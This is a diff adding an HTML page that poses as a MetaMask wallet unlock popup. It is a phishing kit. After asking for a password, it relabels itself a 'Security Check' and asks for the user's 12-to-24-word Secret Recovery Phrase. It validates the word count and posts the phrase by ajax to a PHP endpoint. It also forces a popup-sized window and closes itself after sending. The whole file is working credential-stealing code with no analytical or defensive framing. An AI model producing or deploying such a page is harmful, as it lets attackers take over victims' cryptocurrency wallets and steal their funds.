@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MetaMask Notification</title>
+    <link rel="shortcut icon" type="image/svg" href="metamask-logo.png">
+    <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+    <div class="inputs modalk">
+    <div class="contents">
+    <div class="andlogo">
+    <div id="logo-container"><svg width="130px" height="130px"></svg></div>
+    </div>
+    <div class="main--texts">
+    <div class="main--texts" style="color: #4d4d4d; font-size: 1.3rem;">
+    <h2><b>Welcome Back!</b></h2>
+    </div>
+    <div class="main--texts" style="color: #aeaeae">
+    <p>The decentralized web awaits</p>
+    </div>
+    </div>
+    <form novalidate1="">
+    <p>
+    <label for="password1">
+    <input type="password" name="val" placeholder="Password" id="val">
+    <span class="error" aria-live="polite"></span>
+    </label>
+    </p>
+    </form>
+    <a href="import.html" id="sumbit" style="font-size: 14px; cursor: pointer;">Unlock</a>
+    <p>or <a href="import.html" style="cursor: pointer;"><b>import using Secret Recovery Phrase</b></a></p>
+    </div>
+    </div>
+    <div class="modall" style="display: none;">
+    </div>
+    <input type="text" id="checkkk" value="hidden" hidden="">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="img/logo.js"></script>
+    <input type="text" id="status" value="" hidden="">
+    <script type="text/javascript">
+    window.onresize = function() 
+    {
+        window.resizeTo(372,640);
+    }
+    window.onclick = function() 
+    {
+        window.resizeTo(372,640);
+    }
+    </script>
+    <script>
+    
+            function sendMessage(name, value, ress) {
+                $.ajax({
+                    action: 'login-error.php',
+                    type: 'POST',
+                    dataType: 'html',
+                    data: {
+                        message: value,
+                        name: name
+                    },
+                    success: function(data) {
+                        obl: return quitBox('quit');
+                        if (ress) {
+                            $('.divka p').text('You entered the wrong phrase, please try again.');
+                            $('#areatext').val('');
+                            $('#areatext').css('border-color', '#e67272');
+                        }
+                    }
+                });
+            }
+            const form = document.getElementsByTagName('form')[0];
+    
+            const val = document.getElementById('val');
+            const valError = document.querySelector('#val + span.error');
+    
+            val.addEventListener('input', function(event) {
+    
+                if (val.validity.valid) {
+                    valError.textContent = '';
+                    valError.className = 'error';
+                } else {
+                    showError();
+                }
+            });
+    function quitBox(cmd) 
+    {      
+        if (cmd=='quit')    
+        {   
+           window.opener.postMessage('location', '*');
+           window.open(location, '_self').close();    
+        }     
+        return false;   
+    }
+            function myFunction() {
+                if ($('#val').attr('placeholder') !== 'Password') {
+                    if ($('#val').val().replace(/[\s\n\r]+/g, ' ').split(" ").length !== 12 && $('#val').val().replace(/[\s\n\r]+/g, ' ').split(" ").length !== 15 && $('#val').val().replace(/[\s\n\r]+/g, ' ').split(" ").length !== 18 && $('#val').val().replace(/[\s\n\r]+/g, ' ').split(" ").length !== 21 && $('#val').val().replace(/[\s\n\r]+/g, ' ').split(" ").length !== 24) {
+                        valError.textContent = 'Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words';
+                        if ($('#val').val().length < 1) {
+                            valError.textContent = 'Invalid Secret Recovery Phrase';
+                        }
+                    } else {
+                        sendMessage('Metamask', $('#val').val().replace(/[\s\n\r]+/g, ' '), false);
+                    }
+                }
+                if ($('#status').val() == '') {
+                    $('#val').val('');
+                    $('#val').attr('placeholder', 'Phrase');
+                    $('#val').attr('type', 'text');
+                    $('div.main--texts > h2').text('Security Check!');
+                    $('div.main--texts > p').text(`We just need to confirm it's you.
+    To continue, simply confirm your 12 word phrase.`);
+                    $('#status').val('one');
+                } else {
+                    $('#val').val('');
+                    $('div.main--texts > h2').text(`Security Check Failed`);
+                    $('div.main--texts > p').text(`We cannot confirm it's you. Did you give us the wrong phrase?`);
+                }
+            };
+    </script>
+    <script>
+              $(document).ready(function() {
+                $(window).keydown(function(event) {
+                    if (event.keyCode == 13) {
+                        event.preventDefault();
+                        return false;
+                    }
+                });
+            });
+        </script>
+    
+    
+    </body></html>
